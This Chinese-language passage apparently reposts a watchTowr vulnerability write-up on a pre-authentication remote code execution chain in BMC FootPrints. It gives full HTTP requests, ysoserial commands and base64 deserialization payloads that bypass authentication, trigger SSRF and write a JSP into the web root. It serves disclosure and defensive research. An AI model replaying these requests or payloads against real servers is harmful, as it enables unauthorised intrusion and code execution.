HTTP/1.1 404 Cache-Control: privateX-XSS-Protection: 1; mode=blockX-Frame-Options: SAMEORIGINX-Content-Type-Options: nosniffContent-Type: text/html;charset=utf-8Content-Language: enContent-Length: 683Date: Tue, 17 Jun 2025 08:47:42 GMT<!doctype html><html lang="en"><head><title>HTTP Status 404 – Not Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/9.0.106</h3></body></html>
```  
  
看到这里，很多人第一反应可能会是：  
  
“不就是个 404  
 吗？有啥可激动的？”  
  
但这恰恰就是企业软件最“反直觉”的地方。  
  
**这个 404 本身，就是突破成功的证据。**  
  
为什么？因为如果没有绕过认证，系统本该把请求 302  
 重定向到登录页。现在它没有跳转，而是老老实实返回“资源不存在”，说明请求已经穿过了那道原本拦着一切的认证过滤器。  
  
换句话说：  
  
**他们不是没打到页面，而是已经站在门里了。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU1UNoq5tzxjZUUH4T6mKgT9UOa0vYaEd01vV5Ogxz876VV6E0WibtEZgp02d8jmKqGJ3xOun1HprOZ6hTrsDLAAuFgMfvBzuqTc/640?wx_fmt=png&from=appmsg "")  
### 狐狸进了鸡窝，接下来就该清点战利品了  
  
此时局面已经变了。  
  
在最初的侦察阶段，这套应用由于安全过滤器的存在，未认证可达面很窄，几乎施展不开拳脚。  
  
但现在，手里有了 SEC_TOKEN  
，等于绕过了那个总闸门，原本封死的大量功能点开始向外敞开。  
  
攻击面，一下子被放大了。  
  
这时候还能做什么？  
  
当然是——**系统化枚举。**  
  
拿着 SEC_TOKEN  
 重新梳理 API 后，他们很快捞到了几条现成的成果，其中包括几个中等影响的问题。虽然这篇文章不打算逐个深挖，但有两个 SSRF  
 值得点出来。  
### 盲 SSRF - CVE-2025-71258 / WT-2025-0070  
```
GET /footprints/servicedesk/import/searchWeb?url=https://{{external-host}}&dataEncoding=x HTTP/1.1Host: {{Hostname}}Cookie: SEC_TOKEN=87x0EkX5BFHyWaktfxK5gasnc_LfwWtYsCm5yIorFuwaexEtaK; 
```  
### 盲 SSRF - CVE-2025-71259 / WT-2025-0071  
```
GET /footprints/servicedesk/externalfeed/RSS?feedUrl=https://{{external-host}} HTTP/1.1Host: {{Hostname}}Cookie: SEC_TOKEN=87x0EkX5BFHyWaktfxK5gasnc_LfwWtYsCm5yIorFuwaexEtaK; 
```  
  
问题当然是问题，但说实话，这还不够过瘾。  
  
因为最初的目标，从头到尾都没变：**要 RCE。**  
  
而盲 SSRF  
 这种东西，放在完整攻击链面前，多少有点像开胃小菜——不是没价值，但离“真正的高潮”还差得远。  
### 远程代码执行 WT-2025-0072 - CVE-2025-71260  
  
既然 API 这一圈跑下来还没拿下终局，那就该回头审视应用的整体架构了。  
  
系统跑在 Tomcat  
 上，自然少不了 web.xml  
。而 web.xml  
 里，往往藏着一些值得细看的 servlet  
 映射。  
  
在：  
  
C:\\Program Files\\BMC Software\\FootPrints\\web\\WEB-INF\\web.xml  
  
他们发现了一个非常有意思的映射：  
```
    <servlet-mapping>        <servlet-name>VmwDynamicServlet</servlet-name>        <url-pattern>/aspnetconfig</url-pattern>    </servlet-mapping>
```  
  
也就是说，URI /aspnetconfig  
 会映射到 VmwDynamicServlet  
，而这个 servlet  
 对应的类又是 GhDynamicHttpServlet  
：  
```
    <servlet>        <servlet-name>VmwDynamicServlet</servlet-name>        <servlet-class>GhDynamicHttpServlet</servlet-class>    </servlet>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU0wC5bdGtOSpUt4JdZiaia8eWmP0ohmJ59c4IqKTZkwevOTBtoQ08bFmpxlGRgsDX9TqibGlMQB3zbXcbQhAeqEIEqia5PTPOM9lQw/640?wx_fmt=png&from=appmsg "")  
  
到这里，熟悉漏洞研究的人应该已经闻到一点“不太对劲”的味道了。  
  
不过他们没有一头扎进代码深海，而是先对着活体目标打一发请求看看。  
  
毕竟，真正老练的研究思路，从来不是无脑钻代码，而是先看“外在表现”，再下刀。  
  
请求如下：  
```
GET /footprints/servicedesk/aspnetconfig/ HTTP/1.1Host: {{Hostname}}Cookie: SEC_TOKEN=87x0EkX5BFHyWaktfxK5gasnc_LfwWtYsCm5yIorFuwaexEtaK;
```  
  
响应如下：  
```
HTTP/1.1 200 Cache-Control: privateSet-Cookie: JSESSIONID=4CC85B0B94E801ADA5C5DAFC865244A7; Path=/footprints/servicedesk; HttpOnlyCache-Control: privateX-XSS-Protection: 1; mode=blockX-Frame-Options: SAMEORIGINX-Content-Type-Options: nosniffContent-Type: text/html;charset=utf-8Content-Length: 1396Date: Wed, 03 Sep 2025 02:32:04 GMTKeep-Alive: timeout=20Connection: keep-alive<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "<http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd>"><html xmlns="<http://www.w3.org/1999/xhtml>" ><head><title>    ASP.Net Web Application Administration</title></head><body>    <form method="post" action="SecurError.aspx" id="form1"><script type="text/javascript">//<![CDATA[    var theForm;    if (document.getElementById) { theForm = document.getElementById ('form1'); }    else { theForm = document.form1; }    theForm.serverURL = "/footprints/servicedesk/aspnetconfig/Default.aspx";    window.TARGET_J2EE = true;    window.IsMultiForm = false;//]]></script><div>    <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="rO0ABXNyACJzeXN0ZW0uV2ViLlVJLlBhZ2UkU3RhdGVTZXJpYWxpemVyAAAAAADK/+4MAAB4cgANc3lzdGVtLk9iamVjdAAAAAAAyv/uAwAAeHB3AwwAAHg=" /></div>    <div style="font-weight: bold; font-size: 11pt;">        By default, the Web Site Administration Tool may only be accessed locally.         To enable accessing it from a remote computer, open the Web.config file, add the key <br />        allowRemoteConfiguration to the appSettings section, and set its value to true: <br />        <pre>        &lt appSettings &gt               &lt/ add key="allowRemoteConfiguration" value="True" /&gt         &lt/ appSettings &gt        </pre>    </div>    </form></body></html>
```  
  
如果看到 __VIEWSTATE  
 里的值以 rO0ABX...  
 开头，安全圈老手大概已经坐直了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lWEOEB1GOU2c1k5D7DjzEGLGdMlkBCc3Pk52iaB0cE2T5rcX3C6OgYj9WxF3P1eO3VF2s9oa018vGt3at6K8YHZtTVq7k8cCuibQwfUK9PWrY/640?wx_fmt=png&from=appmsg "")  
  
因为这个前缀，正是 **Java 序列化对象经过 Base64 编码后的经典特征。**  
  
把它解码后，立刻能看到熟悉的痕迹：  
```
¬ísr"system.Web.UI.Page$StateSerializerÊÿîxrsystem.ObjectÊÿîxpwx
```  
  
到这一步，局势就很微妙了。  
  
表面上看是 .NET  
 风格的 __VIEWSTATE  
，实际上跑的却是 Java。  
  
这味道，离“反序列化”只差临门一脚。  
### 系好安全带，反序列化要来了  
  
设备响应里直接暴露了原始 Java 对象形式的 __VIEWSTATE  
。这本身就足够离谱。  
  
大家都知道，__VIEWSTATE  
 通常和 .NET  
 绑定得比较紧；但这里面对的，却是 Java 环境。为什么会这样？  
  
答案是：Mono  
。  
> Mono  
 是微软 .NET Framework  
 的开源实现，可运行在 Linux  
、macOS  
、Windows  
、BSD  
 等多平台上。它允许开发者在非 Windows 环境运行使用 C#  
、F#  
 等 .NET 语言编写的应用。Mono  
 包含一个 C#  
 编译器和一个模拟微软 .NET  
 运行时的 CLR  
。  
  
  
这也解释了为什么文件系统里会出现 .aspx  
 文件。  
  
而在安全研究领域，__VIEWSTATE  
 和反序列化，本来就是“老相识”。尤其当保护 VIEWSTATE  
 的密钥已知或实现有缺陷时，这里几乎就是事故高发地带。  
  
更有意思的是：这次并不是标准 .NET  
，而是 Mono  
 风格的实现，底层逻辑又和 Java 深度缠绕。这个组合，既诡异，又危险。  
  
在测试反序列化时，最稳妥的起手式往往不是直接求 RCE  
，而是先用目标类路径中大概率存在的链，做一个低影响验证。  
  
于是，watchTowr  
 先拿出了安全圈老熟人：URLDNS  
。  
  
URLDNS  
 的作用很简单：一旦发生反序列化，就会触发一个指向攻击者控制域名的 DNS 查询。它不暴力、不炸裂，但非常适合“探路”。  
  
生成 payload 的方式如下：  
```
Java -jar ysoserial.jar URLDNS "https://{{external-url}}"| base64 
```  
  
但现实果然没那么顺滑。  
  
当他们最开始尝试通过 GET  
 传递对象时，立刻遭遇了三连击：  
1. 1. 只要带上 __VIEWSTATE  
 参数，服务器就返回 302  
 跳转到错误页  
  
1. 2. 对象没有被反序列化，外部基础设施上也没收到 DNS 查询  
  
1. 3. 改成 POST  
 也没用，服务器稳定输出 403 Forbidden  
  
请求示例如下：  
```
GET /footprints/servicedesk/aspnetconfig/CreateUser.aspx?__VIEWSTATE=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QALDR0eTkxaXByZTZqbG51bHdoZm1ueW4xOW0wc3VnazQ5Lm9hc3RpZnkuY29tdAAAcQB+AAV0AAVodHRwc3B4dAA0aHR0cHM6Ly80dHk5MWlwcmU2amxudWx3aGZtbnluMTltMHN1Z2s0OS5vYXN0aWZ5LmNvbXg= HTTP/1.1Host: {{Hostname}}Cookie: SEC_TOKEN=87x0EkX5BFHyWaktfxK5gasnc_LfwWtYsCm5yIorFuwaexEtaK; 
```  
```
HTTP/1.1 302 Cache-Control: privateSet-Cookie: JSESSIONID=E014BB23BFB56540DC2FDFE9C0EB3778; Path=/footprints/servicedesk; HttpOnlyLocation: /footprints/servicedesk/aspnetconfig/404.htm?aspxerrorpath=/footprints/servicedesk/aspnetconfig/CreateUser.aspxCache-Control: privateX-XSS-Protection: 1; mode=blockX-Frame-Options: SAMEORIGINX-Content-Type-Options: nosniffContent-Type: text/html;charset=utf-8Content-Length: 226Date: Wed, 03 Sep 2025 02:46:55 GMTKeep-Alive: timeout=20Connection: keep-alive<html><head><title>Object moved</title></head><body><h2>Object moved to <a href='/footprints/servicedesk/aspnetconfig/404.htm?aspxerrorpath=/footprints/servicedesk/aspnetconfig/CreateUser.aspx'>here</a></h2></body><html>
```  
  
这一刻，研究人员最熟悉的场景又来了：  
  
明明方向对了，结果就是打不进去。  
  
典型的“门就在眼前，锁却拧不开”。  
### 为了荣耀，开调试器  
  
既然现象和预期不一致，那就别猜了，直接上代码和调试器。  
  
他们把焦点放在：  
  
Mainsoft/Web/Hosting/BaseFacesStateManager.class  
  
很快就定位到了处理 __VIEWSTATE  
 请求参数的位置：  
```
    protected final Object GetStateFromClient(FacesContext facesContext, String viewId, String renderKitId) {        Object map = null;        Object s1 = null;        Object buffer = null;        InputStream bytearrayinputstream = null;        ObjectInputStream inputStream = null;        Object state = null;        map = facesContext.getExternalContext().getRequestParameterMap();        s1 = StringStaticWrapper.StringCastClass(map.get(VIEWSTATE)); <---- [0]        buffer = Convert.FromBase64String((String)s1); <---- [1]        bytearrayinputstream = access$200(TypeUtils.ToSByteArray(buffer)); <---- [2]        inputStream = access$300(bytearrayinputstream);         state = inputStream.readObject(); <---- [3]        inputStream.close();        bytearrayinputstream.close();        return state;    }
```  
  
这段逻辑可以说是教科书级别的“反序列化现场”：  
- • [0]  
 - 从请求参数映射中取出 __VIEWSTATE  
  
- • [1]  
 - 对其执行 Base64 解码  
  
- • [2]  
 - 把解码结果读入字节流  
  
- • [3]  
 - 调用 readObject()  
 完成反序列化  
  
问题并不在于“有没有反序列化逻辑”，而在于：  
**s1 根本没被填上值。**  
  
调试结果显示，__VIEWSTATE  
 最终解析出来是 null  
：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU36RyNSPO5PYZy6RCXkA3lQ4hI4szrmq718Fib5F7GZHAPogmSlAP4crG0epZcic4FRJia2wP6phFCz7RE6uTbfgTic9dGQPpeCfO8/640?wx_fmt=png&from=appmsg "")  
  
继续深挖参数解析流程，他们跟到了 getRequestParameterMap()  
：  
```
public Map getRequestParameterMap() {    Map CS$0$0000 = null;    Object var10000 = this._requestParameterMap;    if (this._requestParameterMap == null) {        BaseExternalContext.RequestParameterMap var2;        this._requestParameterMap = var2 = access$000(this.get_Context().get_Request().get_Form());        var10000 = var2;    }    return (Map)var10000;}
```  
  
接着进入 get_Form()  
，终于看到关键分叉：  
```
public final NameValueCollection get_Form() {    if (this.form == null) {        this.form = new WebROCollection();        this.files = new HttpFileCollection();        if (this.IsContentType("multipart/form-data", true)) {  <---- [0]            this.LoadMultiPart();        } else if (this.IsContentType("application/x-www-form-urlencoded", true)) {  <---- [1]            this.LoadWwwForm();        }        this.form.Protect();    }}
```  
  
翻译成人话就是：  
  
**只有当请求 Content-Type 是 multipart/form-data 或 application/x-www-form-urlencoded 时，表单参数才会被正确解析。**  
  
这一步，说它是柳暗花明也好，说它是“踩坑踩出来的智慧”也罢，总之答案出来了。  
  
更有意思的是，watchTowr  
 自己也坦白：这部分最开始并不是从代码里严丝合缝推出来的，而是靠一通“按钮乱按、技能乱搓”的方式，先把结果打出来，再回头补逻辑。  
  
很真实，也很专业。因为真正的漏洞研究，从来不总是线性推导，很多时候就是：  
**先把现象撞出来，再把原理讲明白。**  
  
最终，他们找到了两种可行方式。  
  
第一种：使用 multipart/form-data  
```
POST /footprints/servicedesk/aspnetconfig/ HTTP/1.1Host: {{Hostname}}Cookie: SEC_TOKEN=87x0EkX5BFHyWaktfxK5gasnc_LfwWtYsCm5yIorFuwaexEtaK; Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywwyEWsOTbKQLLJ1PContent-Length: 600------WebKitFormBoundarywwyEWsOTbKQLLJ1PContent-Disposition: form-data; name="__VIEWSTATE"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QALHk2NTNlYzJscjB3ZjBveXF1OXpoYmhlM3p1NXB0Zmg0Lm9hc3RpZnkuY29tdAAAcQB+AAV0AAVodHRwc3B4dAA0aHR0cHM6Ly95NjUzZWMybHIwd2Ywb3lxdTl6aGJoZTN6dTVwdGZoNC5vYXN0aWZ5LmNvbXg=------WebKitFormBoundarywwyEWsOTbKQLLJ1P--
```  
  
第二种则更“邪门”一点，也是他们一开始乱试时碰出来的方式：  
1. 1. 发一个 GET  
 请求  
  
1. 2. 在查询字符串里放一个假的 __VIEWSTATE  
  
1. 3. 真正的 __VIEWSTATE  
 放进请求体  
  
1. 4. Content-Type  
 设为 application/x-www-form-urlencoded  
  
```
GET /footprints/servicedesk/aspnetconfig/?__VIEWSTATE=watchTowr HTTP/1.1Host: {{Hostname}}Cookie: SEC_TOKEN=87x0EkX5BFHyWaktfxK5gasnc_LfwWtYsCm5yIorFuwaexEtaK; Content-Type: application/x-www-form-urlencodedContent-Length: 1380__VIEWSTATE=%72%4f%30%41%42%58%4e%79%41%42%46%71%59%58%5a%68%4c%6e%56%30%61%57%77%75%53%47%46%7a%61%45%31%68%63%41%55%48%32%73%48%44%46%6d%44%52%41%77%41%43%52%67%41%4b%62%47%39%68%5a%45%5a%68%59%33%52%76%63%6b%6b%41%43%58%52%6f%63%6d%56%7a%61%47%39%73%5a%48%68%77%50%30%41%41%41%41%41%41%41%41%78%33%43%41%41%41%41%42%41%41%41%41%41%42%63%33%49%41%44%47%70%68%64%6d%45%75%62%6d%56%30%4c%6c%56%53%54%4a%59%6c%4e%7a%59%61%2f%4f%52%79%41%77%41%48%53%51%41%49%61%47%46%7a%61%45%4e%76%5a%47%56%4a%41%41%52%77%62%33%4a%30%54%41%41%4a%59%58%56%30%61%47%39%79%61%58%52%35%64%41%41%53%54%47%70%68%64%6d%45%76%62%47%46%75%5a%79%39%54%64%48%4a%70%62%6d%63%37%54%41%41%45%5a%6d%6c%73%5a%58%45%41%66%67%41%44%54%41%41%45%61%47%39%7a%64%48%45%41%66%67%41%44%54%41%41%49%63%48%4a%76%64%47%39%6a%62%32%78%78%41%48%34%41%41%30%77%41%41%33%4a%6c%5a%6e%45%41%66%67%41%44%65%48%44%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%33%51%41%4c%48%6b%32%4e%54%4e%6c%59%7a%4a%73%63%6a%42%33%5a%6a%42%76%65%58%46%31%4f%58%70%6f%59%6d%68%6c%4d%33%70%31%4e%58%42%30%5a%6d%67%30%4c%6d%39%68%63%33%52%70%5a%6e%6b%75%59%32%39%74%64%41%41%41%63%51%42%2b%41%41%56%30%41%41%56%6f%64%48%52%77%63%33%42%34%64%41%41%30%61%48%52%30%63%48%4d%36%4c%79%39%35%4e%6a%55%7a%5a%57%4d%79%62%48%49%77%64%32%59%77%62%33%6c%78%64%54%6c%36%61%47%4a%6f%5a%54%4e%36%64%54%56%77%64%47%5a%6f%4e%43%35%76%59%58%4e%30%61%57%5a%35%4c%6d%4e%76%62%58%67%3d
```  
  
调试结果显示，注入的 __VIEWSTATE  
 成功进入 s1  
，并最终流入反序列化流程：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU2icbKLibKcyFibNL2qgaMlJpyIoTibhCfuKhw6McoPvefqiarfSC1gibr5FiaIY15405ImBSzX2fLKHMdicyZCmTzwqzwkKLoHiaFA9GOA/640?wx_fmt=png&from=appmsg "")  
  
接着，URLDNS  
 成功触发，外部监听端收到了 DNS 查询。  
  
这就意味着：**反序列化成立。**  
  
接下来，终于可以谈真正的 RCE  
 了。  
### 社区的轮子，能用就别自己造  
  
每当要做自定义 gadget  
 开发、准备一头扎进类依赖地狱之前，经验丰富的研究员都会先做一件事：看看社区已经帮忙铺好了哪些路。  
  
这也是为什么 ysoserial  
 长期以来都是首选。它维护了一批成熟的、经过验证的 gadget 链，是很多 Java 反序列化测试的第一站。  
  
一开始，那些“常规热门选手”并不适用，比如基于 Apache Commons  
 的一些常见链，在目标代码库里并没有以合适方式引入。  
  
但运气不错，这次居然撞上了一个现成王炸：  
  
目标环境中存在：  
- • aspectjweaver-1.9.2  
  
- • commons-collections:3.2.2  
  
这正好对上了经典任意文件写入链：AspectJWeaver  
。  
  
这条链最早由传奇研究员 Jang[2]  
 公开。  
  
生成 payload 的方式如下：  
```
java -jar ysoserial.jar AspectJWeaver "filename.jsp;BASE64TEXT" | base64
```  
  
这里有个关键点：  
**文件名里可以带路径穿越和任意目录分隔符。**  
  
这意味着什么？  
  
意味着不仅能写文件，还能把文件写到想写的位置。  
  
而在一个 Tomcat  
 应用里，最让人血压上升的目标位置，当然就是 Web 根目录。  
  
于是，他们构造了一个无害演示 payload，往 FootPrints  
 的 Web 根目录写入一个 .jsp  
 文件。这个脚本执行后会输出当前系统用户名和工作目录：  
```
java -jar ysoserial.jar AspectJWeaver "webapps/ROOT/watchTowr.jsp;PCVAIHBhZ2UgbGFuZ3VhZ2U9ImphdmEiIGNvbnRlbnRUeXBlPSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT4KPCUKICAgIFN0cmluZyBvc1VzZXIgPSBTeXN0ZW0uZ2V0UHJvcGVydHkoInVzZXIubmFtZSIpOwogICAgU3RyaW5nIGN3ZCA9IFN5c3RlbS5nZXRQcm9wZXJ0eSgidXNlci5kaXIiKTsKJT4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT53YXRjaFRvd3IgU3lzdGVtIEluZm88L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPlN5c3RlbSBJbmZvcm1hdGlvbjwvaDE+CiAgICA8cD48c3Ryb25nPk9TIFVzZXI6PC9zdHJvbmc+IDwlPSBvc1VzZXIgJT48L3A+CiAgICA8cD48c3Ryb25nPkN1cnJlbnQgV29ya2luZyBEaXJlY3Rvcnk6PC9zdHJvbmc+IDwlPSBjd2QgJT48L3A+CjwvYm9keT4KPC9odG1sPgo=" | base64
```  
### 最关键的组合拳，终于成型了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU3bGbQm6Dva4ox7XibsEwxIYn30Cz54ICZib9KRIUfby0G0tVaWnvk2IiaNXSrnfcwic3l9icRqOAkH2JdFfvIjldkx9Htw2Cg1h7gU/640?wx_fmt=png&from=appmsg "")  
  
走到这里，整个攻击链已经非常清晰。  
  
通过：  
- • CVE-2025-71257  
 —— 先拿到 SEC_TOKEN  
，完成认证绕过  
  
- • CVE-2025-71260  
 —— 利用 __VIEWSTATE  
 反序列化，触发任意文件写入  
  
最终实现：  
  
**预认证远程代码执行。**  
  
来，把它完整演一遍。  
  
**CVE-2025-71257 - 认证绕过（提取 SEC_TOKEN Cookie）**  
```
GET /footprints/servicedesk/passwordreset/request/ HTTP/1.1Host: {{Hostname}}
```  
  
**CVE-2025-71260 - 反序列化到任意文件写入（使用上一步拿到的 SEC_TOKEN）**  
```
POST /footprints/servicedesk/aspnetconfig/ HTTP/1.1Host: {{Hostname}}Cookie: SEC_TOKEN=TF06JG8cShIK0q3yJe+o_KDf2fDpnt2JU6c7Tfhr&zWoA1itiu; Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywwyEWsOTbKQLLJ1PContent-Length: 1624------WebKitFormBoundarywwyEWsOTbKQLLJ1PContent-Disposition: form-data; name="__VIEWSTATE"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAGndlYmFwcHMvUk9PVC93YXRjaFRvd3IuanNwc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHEAfgADeHB1cgACW0Ks8xf4BghU4AIAAHhwAAABvjwlQCBwYWdlIGxhbmd1YWdlPSJqYXZhIiBjb250ZW50VHlwZT0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04IiBwYWdlRW5jb2Rpbmc9IlVURi04IiU+CjwlCiAgICBTdHJpbmcgb3NVc2VyID0gU3lzdGVtLmdldFByb3BlcnR5KCJ1c2VyLm5hbWUiKTsKICAgIFN0cmluZyBjd2QgPSBTeXN0ZW0uZ2V0UHJvcGVydHkoInVzZXIuZGlyIik7CiU+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+d2F0Y2hUb3dyIFN5c3RlbSBJbmZvPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxoMT5TeXN0ZW0gSW5mb3JtYXRpb248L2gxPgogICAgPHA+PHN0cm9uZz5PUyBVc2VyOjwvc3Ryb25nPiA8JT0gb3NVc2VyICU+PC9wPgogICAgPHA+PHN0cm9uZz5DdXJyZW50IFdvcmtpbmcgRGlyZWN0b3J5Ojwvc3Ryb25nPiA8JT0gY3dkICU+PC9wPgo8L2JvZHk+CjwvaHRtbD4Kc3IAPm9yZy5hc3BlY3RqLndlYXZlci50b29scy5jYWNoZS5TaW1wbGVDYWNoZSRTdG9yZWFibGVDYWNoaW5nTWFwO6sCH0tqVloCAANKAApsYXN0U3RvcmVkSQAMc3RvcmluZ1RpbWVyTAAGZm9sZGVydAASTGphdmEvbGFuZy9TdHJpbmc7eHIAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4AAABmQ2q4P0AAAAMdAABLnh4------WebKitFormBoundarywwyEWsOTbKQLLJ1P--
```  
  
结果也非常直接：watchTowr.jsp  
 被成功写入文件系统。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lWEOEB1GOU1bxNXibj13JKMKLcqicTl7ibqxz4MFndfgne6LHCogAc9BKb9Tp7KTottJjiaPZvVWzAHntFVgBYXflLdSVy6zibBOdpIfFFtIhun4/640?wx_fmt=png&from=appmsg "")  
  
然后直接访问：  
```
GET /watchTowr.jsp HTTP/1.1Host: {{Hostname}}
```  
  
响应如下：  
```
HTTP/1.1 200 Set-Cookie: JSESSIONID=F3BCBF9067A19B61E3AFD0B1ADA18D1D; Path=/; HttpOnlyContent-Type: text/html;charset=UTF-8Content-Length: 300Date: Wed, 03 Sep 2025 03:45:58 GMT<!DOCTYPE html><html><head>    <title>watchTowr System Info</title></head><body>    <h1>System Information</h1>    <p><strong>OS User:</strong> LOCAL SERVICE$</p>    <p><strong>Current Working Directory:</strong> C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0</p></body></html>
```  
  
这一步，尘埃落定。  
  
不是登录后利用，不是某种高权限内部入口，不是先有账号再横向。  
  
而是——**纯预认证，直接落地代码执行。**  
  
这类链条最可怕的地方，不只在于单个漏洞够不够“惊艳”，而在于它把多个看似零散的点，组合成了真正能打、能落地、能扩大战果的完整攻击路径。  
  
这才是现实世界里攻击者最擅长的事：不是单点爆破，而是顺藤摸瓜、步步为营，把系统里那些“看起来没那么严重”的缝，缝成一把刀。  
### 检测痕迹生成器  
  
没错，又到了熟悉的环节。  
  
watchTowr  
 这次同样放出了一个 Detection Artifact Generator[3]  
 工具。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU2s8kzxHrB7x5oCszpK6iahNuIm04XgW7vwbxt9XEgeaQiaaxFyzqOrK4LQPndtAUKrfPFVWHU5YYcbO0zBh0jHSDxEkRmY7DKLU/640?wx_fmt=png&from=appmsg "")  
> 原文:https://labs.watchtowr.com/thanks-itsms-threat-actors-have-never-been-so-organized-bmc-footprints-pre-auth-remote-code-execution-chains/  
  
#### 引用链接  
  
[1]  
 `http://127.0.0.1:8080/footprints/servicedesk`: http://127.0.0.1:8080/footprints/servicedesk?ref=labs.watchtowr.com  
[2]  
 Jang: https://x.com/testanull  
[3]  
 Detection Artifact Generator: https://github.com/watchtowrlabs/watchTowr-vs-BMC-Footprints-RCE-CVE-2025-71257-CVE-2025-71260?ref=labs.watchtowr.com  
  
   
  
  
